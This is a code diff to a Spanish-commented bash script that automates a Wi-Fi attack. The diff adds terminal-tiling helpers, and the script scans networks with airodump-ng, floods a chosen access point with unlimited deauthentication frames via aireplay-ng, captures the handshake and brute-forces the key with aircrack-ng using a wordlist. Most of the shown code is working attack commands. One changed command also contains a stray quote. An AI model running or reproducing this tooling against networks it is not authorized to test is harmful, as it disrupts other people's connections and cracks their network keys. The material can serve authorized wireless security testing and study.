@@ -76,6 +76,64 @@ select_interface(){
     sleep 2
 }
 
+WIDTH=""
+HEIGHT=""
+CAL_WIDTH=""
+CAL_HEIGHT=""
+get_screen_resolution() {
+    if command -v xrandr &>/dev/null; then
+        resolution=$(xrandr --current | grep '*' | awk '{print $1}')
+        if [[ -n "$resolution" ]]; then
+            WIDTH=$(echo "$resolution" | cut -d'x' -f1)
+            HEIGHT=$(echo "$resolution" | cut -d'x' -f2)
+        else
+            return 1
+        fi
+    else
+        return 1
+    fi
+
+    CAL_WIDTH=$(( WIDTH / 3 ))
+    CAL_HEIGHT=$(( HEIGHT / 3 ))
+    return 0
+}
+
+open_terminal() {
+    local COMMAND_RUN="$1"
+    local SCREEN_SITE="$2"
+    #Se crea una ID falso para que se puede indentificar cada terminal abierta
+    local TERMINAL_TITLE="term_$(date +%s)_$RANDOM" 
+
+    # Abrir terminal en segundo plano
+    x-terminal-emulator -title "$TERMINAL_TITLE" -e "$COMMAND_RUN" &
+
+    # Esperar que la terminal se inicie
+    sleep 1
+
+    # Obtener ID del proceso del terminal
+
+
+    # Obtener ID de la ventana asociada al proceso
+    WINDOW_ID=$(wmctrl -l | grep "$TERMINAL_TITLE" | awk '{print $1}')
+
+    # Mover y redimensionar la terminal
+    if [[ -n "$WINDOW_ID" ]]; then
+        case "$SCREEN_SITE" in
+            "1") wmctrl -i -r "$WINDOW_ID" -e "0,0,0,$CAL_WIDTH,$CAL_HEIGHT" ;;   # Arriba Izquierda
+            "2") wmctrl -i -r "$WINDOW_ID" -e "0,$((WIDTH - CAL_WIDTH)),0,$CAL_WIDTH,$CAL_HEIGHT" ;; # Arriba Derecha
+            "3") wmctrl -i -r "$WINDOW_ID" -e "0,0,$((HEIGHT - CAL_HEIGHT)),$CAL_WIDTH,$CAL_HEIGHT" ;; # Abajo Izquierda
+            "4") wmctrl -i -r "$WINDOW_ID" -e "0,$((WIDTH - CAL_WIDTH)),$((HEIGHT - CAL_HEIGHT)),$CAL_WIDTH,$CAL_HEIGHT" ;; # Abajo Derecha
+            *) echo "ERROR: Posición inválida" ;;
+        esac
+    else
+        echo "No se pudo encontrar la ventana de la terminal."
+    fi
+}
+#Hago unas variables globales para que poder decidir el tamaño 
+UP_LEFT="1"
+UP_RIGHT="2"
+DOWN_LEFT="3"
+DOWN_RIGHT="4"
 
 monitor_mode(){
 
@@ -140,29 +198,39 @@ select_wireless(){
         return 1    
     fi
         
-      
-    
-        
+    TIMEOUT_SCAN="25"
+    # Si estamos en un entorno gráfico
     if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
-        # Estamos en un entorno gráfico
-        x-terminal-emulator -e "sudo timeout 25 airodump-ng -w data_collected/network_dump/networks --output-format csv $MON_INTERFACE --ignore-negative-one --band abg"
+        #Verifica si se puede leer la resolución
+        if get_screen_resolution ; then
+            #Abre una terminal en una determinada posición 
+            open_terminal "timeout $TIMEOUT_SCAN airodump-ng -w data_collected/network_dump/networks --output-format csv $MON_INTERFACE --ignore-negative-one --band abg'" "$UP_LEFT"
+        else
+            # Si no tenemos resulción ejecutaremos una terminal sin determinar la posición ni tamaño.
+            x-terminal-emulator -e "timeout $TIMEOUT_SCAN airodump-ng -w data_collected/network_dump/networks --output-format csv $MON_INTERFACE --ignore-negative-one --band abg"
+        fi 
     else
         # No hay entorno gráfico, ejecutarlo en la terminal actual
-        sudo timeout 10 airodump-ng -w data_collected/network_dump/networks --output-format csv "$MON_INTERFACE" --ignore-negative-one --band abg
+        timeout $TIMEOUT_SCAN airodump-ng -w data_collected/network_dump/networks --output-format csv "$MON_INTERFACE" --ignore-negative-one --band abg
     fi
-
+    
+    #Dejamos que se ejecute en segundo plano el escaneo antes de mirar la informacion
+    sleep $TIMEOUT_SCAN
+    
     if [[ ! -f "./data_collected/network_dump/networks-01.csv" ]];then
         echo "File csv with network not found"
         exit 1
     fi
 
-
     cd  ./data_collected/network_dump/
     FILE="networks-01.csv"
-    #Borrar informacion que no nos interesa.
-    sed -i '/Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs/,$d' $FILE # Se debera alamazenar a posterior.
+    
 
-    # Declarar un array vacío
+    CLIENTS=$(sed -n '/Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs/,$p' "$FILE") # Se debera mirar que clientes estan reconocibles por la cada wifi
+    # Eliminar la información del archivo
+    sed -i '/Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs/,$d' "$FILE"
+
+    # Declarar un array vacio
     declare -a NETWORKS
 
     # Contador de filas (ID)
@@ -211,7 +279,6 @@ select_wireless(){
     rm $FILE
 
     cd .. && cd .. # Se ha de cambiar a ruta no absoluta
-
 }
 
 
@@ -233,13 +300,20 @@ check_band_available() {
     fi
 }
 
-TIMEOUT=""
 
 Deauther(){
 
+    TIMEOUT="$1"
+
     if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
         # Estamos en un entorno gráfico
-        x-terminal-emulator -e " timeout $TIMEOUT aireplay-ng --deauth 0 -a $BSSID_VAR $MON_INTERFACE"
+        if get_screen_resolution ; then
+            ARRIBA_IZQ="1"
+            #Abre una terminal en una determinada posición 
+            open_terminal "timeout $TIMEOUT aireplay-ng --deauth 0 -a $BSSID_VAR $MON_INTERFACE" "$UP_LEFT"
+        else
+            x-terminal-emulator -e " timeout $TIMEOUT aireplay-ng --deauth 0 -a $BSSID_VAR $MON_INTERFACE"
+        fi
     else
         # No hay entorno gráfico, ejecutarlo en la terminal actual
         nohup timeout $TIMEOUT aireplay-ng --deauth 0 -a $BSSID_VAR $MON_INTERFACE > /dev/null 2>&1 &
@@ -271,9 +345,8 @@ Bruteforce(){
     while $USR_INPUT; do
         read -p "Set a time to run the attack recomended at least 20. MIN 10 MAX 200: " TIMEOUT_USR
 
-        TIMEOUT=$TIMEOUT_USR
 
-        if [[ $TIMEOUT =~ ^[0-9]+$ ]] && [[ $TIMEOUT -ge 10 ]] && [[ $TIMEOUT -lt 200 ]];then
+        if [[ $TIMEOUT_USR =~ ^[0-9]+$ ]] && [[ $TIMEOUT_USR -ge 10 ]] && [[ $TIMEOUT_USR -lt 200 ]];then
             
             USR_INPUT=false
             #Cambiamos la interface al canal donde esta la red para poder hacer el ataque por el canal donde esta la red wifi.
@@ -281,16 +354,20 @@ Bruteforce(){
 
             if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
                 # Estamos en un entorno gráfico
-                Deauther &
-                x-terminal-emulator -e " timeout $TIMEOUT airodump-ng -w data_collected/network_dump/wificapture -c $CHANNEL_VAR --bssid $BSSID_VAR $MON_INTERFACE"
+                Deauther "$TIMEOUT_USR" &
+
+                if get_screen_resolution ; then
+                    ARRIBA_DER="2"
+                    #Abre una terminal en una determinada posición 
+                    open_terminal "timeout $TIMEOUT_USR airodump-ng -w data_collected/network_dump/wificapture -c $CHANNEL_VAR --bssid $BSSID_VAR $MON_INTERFACE" "$UP_RIGHT"
+                else
+                    x-terminal-emulator -e " timeout $TIMEOUT_USR airodump-ng -w data_collected/network_dump/wificapture -c $CHANNEL_VAR --bssid $BSSID_VAR $MON_INTERFACE"
+                fi
             else
                 # No hay entorno gráfico, ejecutarlo en la terminal actual
-                Deauther &
-                nohup timeout $TIMEOUT airodump-ng -w data_collected/network_dump/wificapture -c $CHANNEL_VAR --bssid $BSSID_VAR $MON_INTERFACE > /dev/null 2>&1 &
+                Deauther "$TIMEOUT_USR" &
+                nohup timeout $TIMEOUT_USR airodump-ng -w data_collected/network_dump/wificapture -c $CHANNEL_VAR --bssid $BSSID_VAR $MON_INTERFACE > /dev/null 2>&1 &
 
-                sleep $TIMEOUT
-
-                echo "Done"
             fi
         
         else
@@ -299,7 +376,8 @@ Bruteforce(){
         fi
     done
 
-    
+    sleep $TIMEOUT_USR
+
     cd data_collected/network_dump
 
     FILE="wificapture-01.cap"
@@ -315,9 +393,11 @@ Bruteforce(){
 
     if aircrack-ng $FILE -w $WORDLIST ;then
         echo "FOUND KEYS"
+        rm ./*
         exit 0
     else 
         echo "NO FOUND"
+        rm ./*
         exit 1
     fi
 }
